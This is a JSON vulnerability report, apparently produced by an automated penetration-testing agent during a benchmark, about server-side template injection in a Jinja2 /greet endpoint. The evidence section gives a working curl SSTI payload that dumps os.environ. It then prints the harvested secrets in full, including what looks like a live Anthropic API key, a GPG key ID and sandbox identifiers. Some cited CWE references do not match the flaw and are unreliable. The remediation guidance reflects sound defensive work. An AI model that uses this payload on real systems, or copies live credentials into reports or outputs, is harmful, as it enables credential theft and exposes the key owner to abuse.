{
  "title": "Sensitive Environment Variable Exposure via SSTI - API Key Disclosure",
  "severity": "HIGH",
  "description": "The SSTI vulnerability in the /greet endpoint allows attackers to extract sensitive environment variables containing API keys and credentials. Through the vulnerable 'name' parameter, an attacker can access environment variables that contain critical secrets used for external API authentication and infrastructure information.\n\nThe vulnerability exists because:\n1. User input from the 'name' parameter is processed through Jinja2 template rendering without sanitization\n2. Attackers can inject SSTI payloads like {{config.__class__.__init__.__globals__['os'].environ}} to access Python's os module\n3. The os.environ object exposes all environment variables set in the application context\n4. No filtering, encryption, or access controls restrict environment variable exposure\n5. Environment variables are directly rendered in the HTML response\n\nExposed sensitive information includes:\n- ANTHROPIC_API_KEY: Active API key for accessing Anthropic services\n- DAYTONA_SANDBOX_USER: System user information\n- DAYTONA_SANDBOX_ID: Sandbox container identifier\n- DAYTONA_SANDBOX_SNAPSHOT: Container image reference and version\n- GPG_KEY: GPG signing key\n- PATH and other system environment variables that aid attackers in reconnaissance",
  "impact": "HIGH - Credential and API key exposure leading to:\n1. Unauthorized access to Anthropic API services using stolen credentials\n2. Potential financial impact from unauthorized API usage\n3. Information disclosure about the deployment environment (container/sandbox details)\n4. Container/sandbox environment details exposed enabling further attacks\n5. System user information and infrastructure topology disclosure\n6. Potential lateral movement to connected services using exposed credentials\n7. Compromise of dependent services that rely on these API keys",
  "endpoint": "http://localhost:5000/greet",
  "evidence": "POC Command: curl 'http://localhost:5000/greet?name=%7B%7Bconfig.__class__.__init__.__globals__%5B%22os%22%5D.environ%7D%7D'\n\nPOC Execution Output:\n- Exit Code: 0 (Success)\n- Response Status: 200 OK\n\nExtracted sensitive data from response:\n- ANTHROPIC_API_KEY: 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\n- DAYTONA_SANDBOX_USER: daytona\n- DAYTONA_SANDBOX_ID: b9ebfa1a-1940-4a9a-955a-2cfe0c0cdb09\n- DAYTONA_SANDBOX_SNAPSHOT: cr.app.daytona.io/sbox/13555e3f-7130-40f1-9672-711c0ea08562:0.4.3\n- GPG_KEY: 7169605F62C751356D054A26A821E680E5FA6305\n- PYTHON_VERSION: 3.13.3\n- HOSTNAME: b9ebfa1a-1940-4a9a-955a-2cfe0c0cdb09\n\nAll environment variables are returned in the response body (HTML-encoded) via the Jinja2 template rendering, confirming successful exploitation.",
  "pocPath": "pocs/poc_ssti_env_var_exposure.sh",
  "remediation": "1. IMMEDIATE ACTIONS (Critical Priority):\n   - Revoke the exposed ANTHROPIC_API_KEY immediately\n   - Rotate all credentials and API keys stored in environment variables\n   - Regenerate any session tokens or secrets that may have been compromised\n   - Review API access logs for unauthorized usage\n   - Search for any data exfiltration attempts using these credentials\n\n2. SHORT-TERM (Days):\n   - Move sensitive credentials from environment variables to a secure secrets management system:\n     * AWS Secrets Manager / AWS Systems Manager Parameter Store\n     * HashiCorp Vault\n     * Kubernetes Secrets (if containerized)\n     * Google Cloud Secret Manager\n   - Implement access controls to restrict who/what can view environment variables\n   - Use environment variable encryption at rest and in transit\n   - Implement principle of least privilege for application permissions\n   - Sanitize and validate all template inputs before rendering\n\n3. LONG-TERM (Ongoing):\n   - Migrate all credentials to external secrets management systems\n   - Implement container/application secrets injection from secure sources\n   - Disable access to dangerous Python objects from Jinja2 templates\n   - Use Jinja2 sandboxing or restricted evaluation contexts\n   - Implement application-level secret scanning in CI/CD pipelines\n   - Use secret rotation policies with automatic credential updates\n   - Monitor environment variable access and log all attempts\n   - Implement alerting on template injection attempts\n\n4. DETECTION:\n   - Set up alerting on API key usage for suspicious patterns (different IP, unusual time, high volume)\n   - Implement API key anomaly detection for unusual request patterns\n   - Log all SSTI attempts and template expression evaluations\n   - Monitor for access to sensitive globals and environment variables\n   - Deploy WAF rules to detect template injection patterns ({{, }}, __class__, __globals__)\n   - Implement intrusion detection for suspicious API usage",
  "references": "CWE-615: Inclusion of Functionality from Untrusted Control Sphere, CWE-94: Improper Control of Generation of Code, CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code, CWE-640: Weak Password Recovery Mechanism for Forgotten Password, OWASP A01:2021 - Broken Access Control, OWASP A07:2021 - Identification and Authentication Failures, OWASP A03:2021 - Injection",
  "toolCallDescription": "Documenting the SSTI environment variable exposure vulnerability with working POC proof of API key and credential disclosure",
  "timestamp": "2025-11-07T21:40:19.589Z",
  "sessionId": "benchmark-XBEN-076-24-mhpdcdue",
  "target": "./repo"
}